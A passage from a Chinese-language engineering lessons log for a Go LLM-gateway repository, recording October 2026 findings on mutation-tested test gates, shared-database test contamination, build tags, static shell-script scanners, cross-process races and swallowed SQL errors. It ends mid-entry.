  ⑥ ⭐⭐⭐ **共享高危文档（runbook / LESSONS）只增不减** ⇒ 错误结论**就地加订正横幅 + 保留原文**
     （本轮：横幅十七挂 §143.26.3 的表格前，§143.36 正文追加到文件尾）。
- 证据：runbook `§143.36`（A/B 原始读数、门的判据口径、诚实边界）；
  变异 M1~M4（4/4 红 + 逐字还原）。
- 溯源：llm-gateway-go4 §143.36 轮（2026-10-21）。

## 2026-10-21 §143.36 轮 — 共享仓的并行会话会把你「自查发现的坑」提前送到你面前（Seen: 1/3）

- 场景：§143.36 的门写完、准备推送时，`git fetch` 发现远端已有 5 个新提交
  ⇒ 其中一条 LESSONS 写着**「判据要继承既有纪律，不能靠记忆」**（写源码文本判据前
  先 grep 整个仓里同类判据怎么做的）⇒ ★★ **我自己的门正好踩了那条**：
  两个 needle（`(SELECT` / `AVG(`）**可被注释满足** ⇒ 改前形态恰好写在我自己写的
  长注释里 ⇒ 门会判绿。
- ⇒ ⇒ ★★★★ **「别人已经踩过的坑」与「你正在踩的坑」会在共享仓里【对撞】** ——
  ★★ **远端那条 LESSONS 不是「别人的事」，它就是「你这一轮要踩的坑」的预告**。
  ⇒ ⇒ ★ **fetch 到远端有更新时，先读对方那侧的 LESSONS/AGENTS，再动手**。
- ⇒ ⇒ ★★★★★ **自查（本轮）也抓到了两个**（不是靠远端才发现）：
  ① 剥注释层缺失（上面那条）；
  ② ★★ **剥注释器我第一版写的是正则** ⇒ **自证门当场抓到它吃掉字符串字面量里的
  `//` 与 `/* */`**（"http://…" 会被整行吃掉）⇒ ★★ **正则实现不够用**
  ⇒ 改成状态机 ⇒ ★ **同包已有状态机实现 ⇒ 直接复用，别自己写**。
- ⇒ ⇒ ★★★★ **变异脚本：就地改共享工作树 = 有把改坏的源码推上 main 的风险**
  （并行会话一次 `git commit -a` 就行）⇒ ★★ **共享仓的变异脚本默认应是「隔离副本」**：
  `git archive HEAD | tar -x` ⇒ 全部变异只在副本里发生 ⇒ 共享工作树一个字节都不动；
  ★ 前置条件：工作树**已跟踪文件**不干净 ⇒ 副本不是 HEAD 那棵树 ⇒ **脚本先拒绝运行**。
- ⇒ ⇒ ★★★ **「M5 把改前形态追加进注释 ⇒ 门仍绿」是【对的】** ⇒ ★ **绿不是失败，
  先问「我要证明什么」**：正确的 M5 = **把代码删掉、只留注释里的形态**
  ⇒ 剥注释后源码里没有形态 ⇒ 门**必须红** ⇒ 才证明剥注释层承重。
- ⇒ ⇒ ★★ **作废的变异轮次不能算「门没牙」**：本轮 4 个变异第一版全部作废
  （实参个数不匹配 ⇒ `go vet` 红 ⇒ 编译红 ≠ 断言红；needle 不唯一；
  替换串含 needle；M5 方向反了）⇒ ★ **先排除「变异不合格」，再谈「门没牙」**。
- 证据：runbook `§143.36.10`；变异 M1~M5 全红（隔离副本模式）
  + 「共享工作树的已跟踪文件：未被改动 OK」；
  门 `admin/section_14336_board_single_scan_test.go`（**7 条**）。
- 溯源：llm-gateway-go4 §143.36 轮（2026-10-21）。

## 2026-10-21 — ★★★★★ **「全仓 `go test ./...`」在共享真库上不是有效读数；同一个库上跑第二遍数字就不可比**（llm-gateway-go R69 · D3 批次二）
- 场景：要给「v1 族退役后的红门」做全仓盘点 ⇒ 先跑 `go test ./... -count=1` 拿清单。
- 实测翻车（两条独立的坑）：
  1. ★★★ **包是并行跑的** ⇒ 多个包同时写同一个库 ⇒ **互相污染**。
     铁证：`admin/v_analytics_views_session_source_test.go` 在**全仓跑法**下红
     （`premise broken: public._request_logs 又存在了`），而**逐包跑是绿的**
     ⇒ ⇒ 那条红是**别的包建了 v1 表**造成的污染产物。
  2. ★★★ **同一个包、同一份代码，在「全新库」与「用过的库」上失败数不同**：
     实测 `db/` 包 = **4**（全新库）vs **11**（用过的库）⇒ 差出来的 7 条全是
     「库被前面的测试改过」造成的。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **共享真库上的读数，只有「逐包 + 每次全新库」这一种口径可信**；
     ⇒ 「全仓跑一遍」拿到的清单**必须**再逐包复核，否则会把污染当缺陷、把缺陷当污染；
  2. ⭐⭐⭐⭐⭐ **同一个库上跑第二遍 ⇒ 数字不可比** ⇒ 复测必须**重建库**
     （`DB_NAME=itgate_<本轮专用> KEEP_DB=1 bash scripts/audit/probe-onetime-db-shape.sh`），
     ⇒ 且**库名要带本轮标识**（共享库名会被并行会话互删，R68 已踩过）；
  3. ⭐⭐⭐⭐ **「红」的成因排序：先查环境（库状态 / 包间污染 / 探针口径），再查被测对象**；
  4. ⭐⭐⭐⭐ **挂账里的历史数字（R59 的 75 条 / R67 的 57 条）是在污染口径下测的** ⇒ 引用它们时必须打折。
- 证据：`/tmp/r69/full_repo.log`（全仓，22 个失败包 / 102 条）vs
  `/tmp/r69/pkgs{,_2}/summary.txt`（逐包隔离）vs
  `/tmp/r69/db_fresh_fails.txt`（db/ 全新库 = 4）。
- 溯源：llm-gateway-go R69 轮（D3 侧·批次二），§19.19.1/§19.19.2。

## 2026-10-21 — ★★★★★ **共享 helper 的定义文件不能带 build tag**（llm-gateway-go R69 · D3 批次二）
- 场景：origin/main 的提交 `2c628fd7b` 让 `admin/section_14336_board_single_scan_test.go`
  复用了 `stripGoCommentsKeepingStrings`（它住在 `admin/request_logs_retirement_tiering_test.go`）。
- 实测翻车：★ 那个文件带 `//go:build !integration` ⇒ **在 `-tags=integration` 的树里 helper 不存在** ⇒
  `vet: admin/section_14336_board_single_scan_test.go:69:9: undefined: stripGoCommentsKeepingStrings`
  ⇒ ⇒ **整棵 integration 树编译不过** ⇒ ⇒ 连带拉红 `sql/schema::TestIntegrationTaggedTreeCompiles`
  （★ **那道门本来就是为抓这种问题而存在的**）⇒ ⇒ 并且**挡住所有 `-tags=integration` 的跑法**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **共享 helper 的定义文件不能带任何 build tag** ——
     只要**任何一个**使用方在另一种 build 里，它就必须两边都在；
     ⇒ 判别方法：`grep -rn "func <helper>" --include='*.go' .` 看**定义文件**头两行有没有 `//go:build`；
  2. ⭐⭐⭐⭐ **反过来也成立**：只被一种 build 用的 helper **不该**放在这个文件里
     （它在另一种 build 里会变成死代码）；
  3. ⭐⭐⭐⭐ **「整棵 integration 树编译不过」是最高优先级的缺陷** ——
     它比任何单条门红都更贵（**所有** integration 腿都跑不了）；
  4. ⭐⭐⭐⭐ **修法要避开别人的文件**：把 helper 移到**新文件**（不带 tag），
     原文件留一行说明 ⇒ **同文件单写者纪律**不冲突。
- 证据：`admin/go_comment_strip_test.go`（新）＋ `admin/request_logs_retirement_tiering_test.go`（移出 helper）；
  `go vet -tags=integration ./...` 干净；`sql/schema::TestIntegrationTaggedTreeCompiles` 转绿。
- 溯源：llm-gateway-go R69 轮（D3 侧·批次二），§19.19.1。

## 2026-10-21 — ★★★★ **守卫要问「测量要用的全部关系」，而不是其中一个**（llm-gateway-go R69 · D3 批次二）
- 场景：一道真库门先探测「被测对象还在吗」，不在就 skip；探测通过后才跑测量 SQL。
- 实测翻车：★ 守卫查的是 **`_request_logs`（母表）**，而测量 SQL（`s4ScopeBody`）读的是
  **`_request_logs_hot` ∪ `_request_logs`** ⇒ ⇒ **母表在、hot 表不在**时守卫**假阳性**
  ⇒ ⇒ 门继续往下跑 ⇒ 在 hot 表上 42P01 ⇒ ⇒ **报出来像「代码坏了」，其实是「守卫问错了问题」**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **守卫的谓词必须与测量 SQL 的依赖集合**逐字对齐** ——
     ⇒ 最稳的写法是**直接探测测量要用的那几个关系**（本轮改成两个都查）；
  2. ⭐⭐⭐⭐ **「被测对象还在吗」与「被测对象**完整**吗」是两件事** ——
     ⇒ 退役常常是**半退役**（父表在、hot 表不在）⇒ 守卫必须按「**缺一个就不可测**」写；
  3. ⭐⭐⭐⭐ **skip 的措辞要写清「缺哪一个」** ⇒ 否则「半退役」会被读成「全退役」；
  4. ⭐⭐⭐ **门红了先读门在守什么** ⇒ 这次正是「门守的东西少了一半，而门只问了一半」。
- 证据：`cmd/gateway/s4_gate_measurement_test.go`（守卫改成探测两个关系 ⇒ 由红转诚实 skip）；
  变异 M5（守卫退回只查母表）⇒ **红** ⇒ 证明这条守卫是承重的。
- 溯源：llm-gateway-go R69 轮（D3 侧·批次二），§19.19.2。
- 溯源：三项目会话治理 B4 轮（2026-10-20）。

## 2026-10-21 — 门的「前提」会随被观测对象一起消失：门红 ≠ 实现坏（Seen: 1/3）
- 任务 / 缺陷：本轮全仓 `go test ./...` 扫出 4 个**既有红门**（origin/main 上就红），
  其中 3 条的根因不是实现坏了，而是**门在守一个已经不存在的对象**。
- 根因：迁移 890（v1 族退役）把 v1 族整族 DROP，**并把依赖 v1 表的认领逻辑一并删除** ⇒
  ① `internal/sessionv2mirror` 的两条门要求 `client.go` 里有 `entry.T0Missing = true`
     （它由「查 v1 表有没有 t0 行」得出）⇒ 该设置点随 v1 退役消失 ⇒ 门恒红；
  ② `domains/streaming` 的 audio 门要求「门开时 INSERT 照发」⇒ 那个写点已退役成
     **有文档的 no-op** ⇒ 门恒红；而它的另一半「停写时零写入」⇒ **恒绿**（测了个寂寞）；
  ③ `scripts/ursmcheck` 的 LESSONS 冲突标记门用**裸子串**匹配 ⇒ 把 LESSONS.md 里
     **讲「冲突标记翻车」的那条经验正文**判成真冲突 ⇒ 门恒红 ⇒ **真冲突反而看不见**。
- 防复发检查：任何红门先问三句 —— **① 门在守什么？② 那个被守的对象还在吗？
  ③ 门红了是「实现变坏」还是「前提消失」？** 前提消失时的处置**不是把实现改回去
  （那是推翻既定决策），也不是把门删了（删掉就把「复活所需的登记」一起删了），
  而是**改成钉「退役这件事本身」**：触发源必须仍然不存在 + **必须留下显式登记**
  （文件头写明「哪个触发源退役了 / 哪一列从此恒为 NULL / 债指向哪」）。
  ⇒ 同时把「恒绿的那一半」也一起改掉（否则门看起来还是绿的，却什么都测不到）。
- 证据：`internal/sessionv2mirror/abandoned_turn_gate_test.go`
  （`TestAbandonedTurnTriggerSourceIsRetired`）、`internal/sessionv2mirror/final_success_turn_gate_test.go`
  （`TestFinalSuccessClaimIsSetOnTheEntry`）、`domains/streaming/audio_usage_gate_test.go`
  （3 条）、`scripts/ursmcheck/process_record_guard_test.go`（`findConflictMarkers` + 自检）；
  变异 harness `scripts/audit/verify-v1-retirement-red-gates.sh`（M1/M4~M8）。
- 状态：待观察

## 2026-10-21 — 静态判据的扫描面要按「哪台机器会执行它」分档，否则会逼人做无意义的事（Seen: 1/3）
- 任务 / 缺陷：为「仓内 shell 脚本不得依赖 bash 4+ 特性」写静态门时，先按「全仓 300+ 脚本」
  扫 ⇒ 立刻命中 16 个**只在 Linux 生产主机上跑**的部署脚本 ⇒ 若按「一刀切禁止」处理，
  就要给这 16 个脚本加毫无必要的声明或改写 ⇒ **过宽的门比没有门更坏**（它训练人绕过门）。
- 根因：① macOS 自带 **bash 3.2**（实测 `GNU bash, version 3.2.57`），Linux 是 bash 5
  ⇒ bash 4+ 特性在 macOS 上 `bad substitution` 直接退出、在 Linux 上完全正常
  ⇒ **平台依赖的假绿**：CI 跑 Linux ⇒ 这条路径恒绿，缺陷只在开发者机器上现形；
  ② 仓内**早就有**同纪律（`scripts/checks/install-entrypoints-test.sh:7` 写着
  「install.sh 必须能被 macOS 自带的 bash 3.2 解析（不用 mapfile / ${var,,}）」），
  但**覆盖面不全**（只查 user scripts 与 install 入口）⇒ 本轮把同一纪律扩到
  `deploy/sql/` + `scripts/audit/` + `scripts/checks/`。
- 防复发检查：静态判据的**扫描面必须按执行环境分档**，判据写「在哪台机器上跑」而不是
  「在哪个目录」。⇒ 并且**清单里的每条规则必须内置一个最小样本**（清单与样本不可能分叉）；
  ⇒ **实测**确认一条候选特性是不是真 bash 4 特性（本轮实测 `&>` / `&>>` **是 bash 3.x 就有的**
  ⇒ 若不实测就会把 16 个脚本推进无意义的声明里）。
- 证据：`sql/schema/shell_bash_compat_gate_test.go`（含 7 条自检）；
  实测 macOS bash 3.2 对 `&>` 的行为（rc=0、文件写出）；生产部署脚本 16 处的清单在门文件头。
- 状态：待观察

## 2026-10-21 — 静态扫描器自己也会瞎：剥注释 / 剥字面量 / heredoc 三层各有盲区（Seen: 1/3）
- 任务 / 缺陷：写「shell 脚本不得用 bash 4 特性」的静态门时，扫描器先后踩了 5 个盲区，
  每一个都表现为「门绿但读数瞎了」。
- 根因（5 个盲区，全部实测暴露）：① 注释里**引用**特性（`# 不要用 ${v^}`）被误判
  ⇒ 要剥注释；② 单引号里的 `mapfile` 是**字面量**（真实踩坑：`checks/install-entrypoints-test.sh`
  **自己禁止 mapfile**、自己写了 `mapfile` 作为 grep 的正则字面量）⇒ 要剔单引号；
  ③ **未加引号的 heredoc 体会被 shell 展开** ⇒ 体里的 `# ${obj_type^}` 是**可执行面**
  （它长得像注释但正是缺陷本体）⇒ 剥注释时**必须保留 heredoc 体**；
  ④ **引号定界的 heredoc 体是字面量**（`<<'PYEOF'` 里是 Python 源码）⇒ 反而要整段剔除；
  ⑤ 双引号内**只有 `${...}` / `$(...)` 是可执行面**，其余是字面量 ⇒ 要按词法处理。
  ⇒ 另有一个**纯实现 bug**：解析 heredoc 定界符时**没把引号算进推进量** ⇒ 闭合引号被当成
  普通单引号翻转了状态 ⇒ **后面整段解析全错**（表现为「明明在引号里，行首的 `if ...` 却整段消失」）。
- 防复发检查：任何「扫文本找 X」的判据，都必须问一句「**我的扫描面本身对不对**」：
  ① 每条规则**内置最小样本**并自检「抓得到自己的样本」；
  ② 自检必须同时覆盖**过宽**方向（「bash 3.2 支持的写法不被误判」）——
  过宽的扫描器会把正常写法全变成红；
  ③ 变异验证要打在**扫描面失效**的那一层（本轮第一次变异打在 `${obj_type^}` 上**没变红**
  ⇒ 才发现剥注释把 heredoc 体吃了 ⇒ **只有「删一行看门是否红」能暴露量具瞎了**）。
- 证据：`sql/schema/shell_bash_compat_gate_test.go` 的 7 条自检
  （每条规则抓得到自己的样本 / bash 3.2 写法不误判 / 已剔除项不误判 / 单引号字面量 /
  双引号转义 / heredoc 体 / 注释引用）；变异 M2、M3（`scripts/audit/verify-v1-retirement-red-gates.sh`）。
- 状态：待观察

## 2026-10-21 — 变异还原必须按原路径 md5 校验；`git checkout --` 会把修复本身一起丢掉（Seen: 1/3）
- 任务 / 缺陷：本轮做 M2 变异验证时，用 `git checkout -- <file>` 还原 ⇒ 它回到的是 **HEAD**，
  而本轮的修复**还没提交** ⇒ **修复本身被一起丢掉**；更糟的是「还原校验」读的也是同一个错路径
  ⇒ **报出假读数**。
- 根因：`git checkout --` 的语义是「把工作区恢复成 HEAD」，不是「撤销我刚才的临时改动」。
  ⇒ 在「修复未提交」的窗口里用它 = 自毁。
- 防复发检查：变异还原一律走「**备份 → 精确还原 → 按原路径 sha256 逐字校验**」，
  **禁止**用 `git checkout --` / `git restore`；校验必须读**被改的那个路径**，
  而不是备份或别处。⇒ 本轮把这条纪律写进了变异 harness 的注释与实现
  （`restore_file` 还原后立刻比对 sha256，不一致即判失败）。
- 证据：`scripts/audit/verify-v1-retirement-red-gates.sh`（`restore_file` + 逐条「还原后必须重新全绿」）。
- 状态：待观察

## 2026-10-21 — 「留痕/登记」类判据必须有一份**机器可读**的；只查关键词的门恒绿（Seen: 1/3）
- 任务 / 缺陷：本轮修 4 个既有红门时，**两个新写的门自己被判为「没牙」** ——
  变异注进去后它们**仍然绿**。
- 根因（两个门，两种「太粗」）：
  ① `domains/streaming` 的「no-op 必须留痕」门查的是「文件里出现过 `slog.`」
     ⇒ 变异写成 `_ = slog.Default`（**取值**不是**调用**）就能骗过它
     ⇒ 门恒绿 ⇒ 什么也没测；
  ② `internal/sessionv2mirror` 的「退役登记必须留痕」门查的是「注释里出现过『退役』」
     ⇒ 而**全文别处也有这两个字** ⇒ 实测把登记段首句**整句抹掉**，门**仍然绿**
     ⇒ 门恒绿 ⇒ 什么也没测。
  ⇒ ★ 两者同族：**判据钉的是「某个字符串出现过」，而不是「某个形态真的变了」**。
- 防复发检查：
  1. 判据要钉**可区分的形态**，不能钉「关键词出现」：
     ① 日志 ⇒ 钉**调用**（`slog.Debug(`）而不是 `slog.`；
     ② 登记 ⇒ 钉**机器可读的那一份**（本轮加了一枚包级常量
        `abandonedTurnTriggerRetired`）—— 注释留给人读，常量留给机器钉
        （包级常量即使无人引用，Go 也不报未使用）；
  2. ⇒ **通用式**：任何「要求某处留下登记」的判据，都必须问一句
     「**我能不能只删掉登记、而门还绿？**」能 ⇒ 门没牙。
  3. ★ 本轮这个坑在**同一天出现三次**（LESSONS 冲突标记门 / slog 门 / 退役登记门）
     ⇒ 「门红了先读门在守什么」之外，还要加一句「**门绿了先问门有没有牙**」：
     ⇒ 唯一的验证手段是**变异**：改坏它，看它红不红。
- 证据：`domains/streaming/audio_usage_gate_test.go`（`TestLogAudioUsageNoOpLeavesATrace`
  改为钉调用形态）、`internal/sessionv2mirror/abandoned_turn.go`（新增常量）、
  `internal/sessionv2mirror/abandoned_turn_gate_test.go`（钉常量的值）、
  变异 M5 / M7（`scripts/audit/verify-v1-retirement-red-gates.sh`，终态 16/0）。
- 状态：待观察

## 2026-10-21 — 变异 harness 自己会被同一批坑绊倒：编译红不算数、grep 按行计数、中文标点吃掉变量名（Seen: 1/3）
- 任务 / 缺陷：本轮把变异 harness 写成可复现入口后，**第一次跑就 5 条失败** ——
  但 5 条失败**全部是 harness 自身的缺陷**，不是被测修复的缺陷
  ⇒ 若不逐条区分，就会误判「修复没生效」并去改本来正确的实现。
- 根因（5 个坑，每个都会让「红」变成假信号）：
  ① `grep -c -F` 按**行**计数 ⇒ 多行锚点被拆开分别匹配 ⇒ 报「命中 248 次」
     而实际只有 1 处 ⇒ 变异被拒绝注入 ⇒ 看起来像「门没牙」；
  ② 锚点含**真实 tab** 在 shell heredoc 里写不出来 ⇒ 改用 **base64 传参 + python helper**
     （helper 支持 `\t` / `\n` 转义）；
  ③ 替换物含 `\$1` / 真实换行 ⇒ 注入后 Go **编译红** ⇒ 按纪律「编译红不算数」
     ⇒ 必须改成**编译干净**的等价代码（例：`_ = slog.Default` 而不是删掉整个调用）；
  ④ ★ **bash 会把中文标点吃进变量名**：`say "…$label：…"` ⇒ `label…: unbound variable`
     ⇒ 全部改成 `${label}` 显式界定；
  ⑤ 变异插在**结构体定义**里（函数字面量非法）⇒ 编译红 ⇒ 改插在函数体内。
- 防复发检查：harness 的每条变异都要能回答三问 ——
  **① 锚点是否恰好命中 1 次？（用字面量计数，不是行计数）
  ② 注入后是否仍能编译？（编译红 = 不算数）
  ③ 变红的是不是预期集合里的那条测试？**
  ⇒ 并在 harness 里把这三问写成**显式检查**（不是靠人记），
  收尾再要求「还原后基线重新全绿」。
- 证据：`scripts/audit/verify-v1-retirement-red-gates.sh`（5 条硬规则的注释与实现）、
  `scripts/audit/_mutate_helper.py`（`count` / `replace` / `replace_line` 三个子命令）。
- 状态：待观察

## 2026-10-21 §143.37 轮 — 「加一个快路径」的改动，可能把一条重读面变成【每次必跑】（Seen: 1/3）

- ⇒ ⇒ ★★★★★ **通用式：给一条读面加快路径时，要检查「旧路径的入口是不是也变成无条件了」** ——
  ★★ 本轮实测：`queryOverviewCounts` 原本**只有**日志回退（`9ef13731f`），
  `272e1bf93` 加上了分钟路径**和** 42P01 判据，意图显然是「快路径当主、关系缺失才回退」
  —— ★★ **但收尾的 `return h.fillOverviewCountsFromLogs(...)` 落在了 `if` 块【外面】**
  ⇒ **快路径成功时也照跑慢路径** ⇒ 一条重量级读面变成**每次必跑**。
  ⇒ ★★ **⇒ 判别动作（比读 diff 更可靠）：问「旧路径的结果还有可能被采用吗？」**
- ⇒ ⇒ ★★★★ **「结果会被丢弃」+「无条件执行」= 纯浪费，而且【不会报错、载荷一模一样】** ——
  ★ 本轮 `fillOverviewCountsFromLogs` 只在计数为 0 时写回
  ⇒ **两个计数非零时，那一整扫的结果被逐字丢弃**
  ⇒ **它 2 天跑了 412 次、读了 21.8 GB 物理读、占了 1,108.7 s 库时间，
  而算出来的数字一次都没被采用过**。
  ⇒ ⇒ ★★ **⇒ 这类退化必须靠门挡住，不能靠 review 记忆**（它对 review 完全是隐形的）。
- ⇒ ⇒ ★★★★ **归属判别要问「这条读面是【被谁】在什么条件下触发的」，而不是「它叫什么名字」** ——
  ★ 本轮既有判词「看板 fallback 只在分钟统计缺覆盖时触发」**被证伪**：
  `fillOverviewCountsFromLogs`（降级读面）本身确实只在该跑的时候跑，
  ★★ **但 `queryOverviewCounts` 这条链上的同一函数是【无条件】的**
  ⇒ **同一个函数名，两条调用链，两种门控** ⇒ ★★ **按函数名归因会归错**。
- ⇒ ⇒ ★★★ **门要用【行为表】，不要用文本判据** —— 门要挡的失败模式
  （门控被删 / 判定写反 / 只判一个计数）在源码文本上都能长得「很像有门控」
  ⇒ 只有**真的调用判定函数**才能区分。
  ⇒ ★★ **并且要有「前提门」**：门控之所以是零语义风险，靠的是
  「旧路径只在计数为 0 时写回」这条**代码事实**
  ⇒ 一旦它被改成「总是覆盖」，前提消失 ⇒ **前提门必须红**。
- ⇒ ⇒ ★★ **诚实边界要单独钉住**：本轮改法让「两计数非零」时的错误面从
  「可能返回错误」变成 nil ⇒ 之所以可判定为不可观测，**靠的是两个调用点都用 `_ =` 丢弃**，
  ⇒ ★ **这条必须写成门**，否则将来有人开始使用这个错误时，门不会提醒。
- ⇒ ⇒ ★★★ **子串计数在本仓是第 2 次同款坑**（第 1 次是 §143.36.8 的「`AS r` 计数 50」）：
  `FROM public.session_turns` 是 `FROM public.session_turns_hot` 的**子串**
  ⇒ 朴素 count 把 hot 腿也计进 parent 腿 ⇒ **普查第一版报「9 处命中」、其中 3 处是假命中**；
  修正口径（parent = count(parent) − count(parent_hot)）后真实命中 6 处、**产品代码 0 处**
  ⇒ ★★ **结论从「admin 包外没有」升级为「全仓产品代码里没有」**
  ⇒ ★ **每次做「字符串计数」类判据，先问「needle 是不是另一个 needle 的子串」。**
- 证据：runbook `§143.37`（+ **订正横幅十八**，就地订正 §143.36.8 的第 1 条与第 3 条）；
  生产只读实测（2026-10-21）：日志回退 **412 次 / 22,369.5 MB / 1,108.7 s 库时间**，
  分钟路径 512 次 / 289.1 s；门控 A/B **6/6 组合逐值等价**（`value_equivalent = t`）；
  全仓普查脚本 `scripts/audit/scan_14337_heavy_source.py`（产品代码 0 命中）；
  门 `admin/section_14337_overview_counts_gate_test.go`（**6 条**）；
  变异 `scripts/mutate-14337-overview-counts-gate.py`（**隔离副本模式**，M1~M7 全红）。
- 溯源：llm-gateway-go4 §143.37 轮（2026-10-21）。

## 2026-10-21 — 「按代码里的清单片段断言库形态」是假缺的高发区：同一份代码里还有另一处决定取值的代码（Seen: 1/3）
- 任务 / 缺陷：本轮回头审计自己上一轮的结论，审出**一处真错判**：
  上一轮写「`session_turns.tools` 是死列 —— 写方列清单（`domains/session/v2/turn_writer.go:449-489`）里
  没有它，也无迁移回填 ⇒ 真实工具事实在 `session_tools`」，并据此把 G-6 判成「未落地」。
  ⇒ 实测**该判定的证据本身是无效的**，而结论**方向完全相反**。
- 根因（两层）：
  ① ★ **只看了一处清单**：那段 449-489 的 INSERT 列清单**是真的**、它**真的不含** `tools` ——
     但**同一个文件**里还有 `turn_writer.go:302` 的 `turnToolsJSONBExpr`（子查询聚合 `session_tools_hot`），
     并在 INSERT 列清单 `:598` 落列 ⇒ **「代码里没写」≠「代码里没有」**：
     取值可以来自同文件的常量/表达式，而不是列清单本身；
  ② ★ **没量库里的实际填充率**：生产 252 实测 `session_turns` 1,060,685 行，
     NULL **0** / 空数组 `[]` **1,060,685** / 非空数组 **0** ⇒ 该列**是活的**，
     而「无迁移回填」也是错的（`sql/migrations/startup/889_session_turns_tools_population.sql`
     裁决「填充不删」）。
  ⇒ ⇒ 顺带发现一个**次生**错误：因为「列是死的」推不出「工具事实在别处」，
     文档又写了「真实工具事实在 `session_tools`」⇒ 实际上 `session_tools` 族
     （父表 + 3 个月分区 + hot）**全部 0 行** ⇒ **两套工具事实表并存，但其中一套零流量**。
- 防复发检查：
  1. ★ **判「库里的某列/某表是什么样」时，量库里，不看代码**：
     至少量三样 —— **行数 / 形状分布（NULL vs 空值 vs 非空）/ 归属表的行数**。
     代码只用来解释「为什么是这个形状」，不用来断言「形状是什么」。
  2. ★ **一个结论如果建立在一处「清单」上，必须再问一句「同一份代码里还有没有第二处决定它的地方」** ——
     常量、表达式、helper、trigger、migration 都可能是第二处。
  3. ⇒ **通用式：代码清单是「实现的一个侧面」，不是「实现的全部」；
     清单能证明「这里没有」，不能证明「全仓没有」。**
- 证据：方案文档 `docs/audit/2026-10-20-三项目会话治理-审计与执行方案.md` §13.8.2（订正全过程）、
  §0.2 A2 行、§2 D3d 行；生产 252 只读实测（1,060,685 行 / NULL 0 / 非空 0）。
- 状态：待观察

## 2026-10-21 — 单表 0 行不能断定「无流量」：要多个**互相独立**的表族同时为 0 才能（Seen: 1/3）
- 任务 / 缺陷：上一条经验把 `session_turns.tools` 判成「空 ⇒ 零流量」，
  但那一步**只查了一张表** ⇒ 一旦这张表为空的原因是「写失败」或「被门控」，
  结论会整个反过来（本轮就先把 106 万行**空数组**误算成「非空」，方向完全相反 ——
  原因是把 `'{}'::jsonb`（空对象）与 `'[]'::jsonb`（空数组）混为一谈）。
- 根因：
  ① `count(*)`/「有值」返回 0/空，至少有**四种**成因 ——
     **真空 / 写失败 / 被门控 / 统计陈旧**（本仓 `pg_stat_user_tables.n_live_tup` 的陈旧估计
     曾把 0 行报成 876 —— 与 §5.4 的 GUC 隔离是同族陷阱）；
  ② **一张表为空无法区分这四种成因**，需要**多个成因各自独立的表族同时归零**才收窄到「上游零流量」。
- 防复发检查：
  1. ★ 判「某条链路没流量」⇒ 至少找 **2 个以上成因互相独立的表族**，全部为 0 才下结论；
     若只有一张表 ⇒ 只能写「该表为空」，**不能**写「链路无流量」。
  2. ★ **量「空」要量形状，不能量真假**：JSONB 至少分 **NULL / `[]` / `{}` / 非空**；
     本轮的实测口径是 `jsonb_array_length(tools) > 0`（按**数组**判），
     而不是 `tools <> '{}'`（那是按**对象**判）。
  3. ★ 判「表里有数据」之前先确认**读法能穿过该表的隔离策略**（RLS / GUC）：
     `count(*)` 返回 0 有三种成因（§5.4 已记），必须三者排除。
- 证据：方案文档 §13.8.3（两条量具口径错误实录）；生产 252 只读实测 ——
  `session_tools` 族 6 张表 + `tool_usage_stats`/`_hot` 2 张表**全部 0 行**，
  而写方 `domains/toolexecution/postgres_store.go:61` 与接线
  `cmd/gateway/tool_execution_integration.go` 都是**活的** ⇒ 收窄到「上游零流量」。
- 状态：待观察

## 2026-10-21 — 进程内互斥 ≠ 互斥：同库多实例会互删对方的写入（Seen: 1/2）
- 任务 / 缺陷：`credential_model_index` rollup 是 **DELETE + INSERT 两条语句**，
  两条各走一次 `r.db.Exec`（= 两个隐式事务）。两个网关实例共用同一个库时，
  旧构建的 rollup（INSERT 42703 失败）**每 5 秒把新构建刚写的 75 行删掉且补不回来**
  ⇒ `credential_model_index_hot` 的 `n_live_tup=0`（实测 `n_tup_ins=1036` / `n_tup_del=968`）。
- 根因：
  ① **非原子**：中间态对读者可见；
  ② **进程内 singleflight 只覆盖本进程**（ticker / LISTEN / admin 手动接口三个触发源），
     跨进程完全无效；
  ③ 后果不是「指标陈旧」而是**功能缺失**：autoroute 候选池读
     `credential_model_index_with_current_month`（hot ∪ 月分区），
     新出现的 `(credential_id, raw_model)` 在月分区里要等 **8h** 排水窗口才可见
     ⇒ 在此之前该组合**根本不在候选池里** ⇒ `model_not_found` / `no_candidate` ⇒ **100% 流量失败**。
- 防复发检查：
  1. ★ 凡「先删再写」的周期性刷新，**两条语句必须同事务**，且**先取跨进程 advisory lock**
     （`pg_advisory_xact_lock(hashtextextended('<literal>', 0))`）——
     本仓约定见 `settings/session_write_safety.go`；
  2. ★ 部署形态里只要存在**两个实例同时对着同一个库**（本仓蓝绿部署
     `scripts/deploy-seamless-docker.sh` 的候选槽 + 旧槽窗口**自带**这个风险面），
     就要逐个清点「哪些后台 worker 会写库」，并给每条写路径配锁；
  3. ★ 诚实边界：锁只对**同样会取锁的构建**有效 ⇒ 对方没升级时，锁不解决问题，
     必须靠把对方升级（**别把「我加了锁」当成「问题消失了」**）。
- 证据：`docs/audit/2026-10-21-R69-R70-跨进程竞态与静默降级残留.md` §2；
  活库读数 `pg_stat_user_tables`；门 `bg/auto_index_refresher_rollup_atomic_test.go`
  （AST 形状门 + 真库阻塞门，变异 M1/M2 全红 + sha256 逐字还原）。
- 状态：已修（cecf1460b）

## 2026-10-21 — 「接口返回 200」≠「功能可用」：被吞掉的错误会让面板恒空（Seen: 1/4）
- 任务 / 缺陷：本轮从 PG 错误日志里一次挖出**四处**「页面上看不出报错」的残留 ——
  ① `sd.session_id`（42703，列不存在）⇒ 任务分析详情页两个面板**恒空**；
  ② `ARRAY_AGG(...)[1:5]`（42601）+ `COALESCE(tags,'[]'::jsonb)`（42804，列实为 `text[]`）⇒ 标签列表**恒空**；
  ③ 已 DROP 的 `_request_logs` 仍在分区清单里 ⇒ 每次查状态 42P01 + WARN 噪声；
  ④ `system_probe_runs.total_tokens`（42703）⇒ 系统监控「近 1 小时」四个计数**恒为 0**。
  它们的共同点：**错误被 `if err == nil {…}` 或 `_ =` 吞掉**，接口照样 200。
- 根因：① 降级可以接受，但**降级原因必须留痕**；② 列名/字面量漂移（列改名、类型变更）
  在「内联 SQL + 吞错」的结构里**没有任何可见信号**；
  ③ 「接口 200」只证明**请求处理完了**，不证明**查到了东西**。
- 防复发检查：
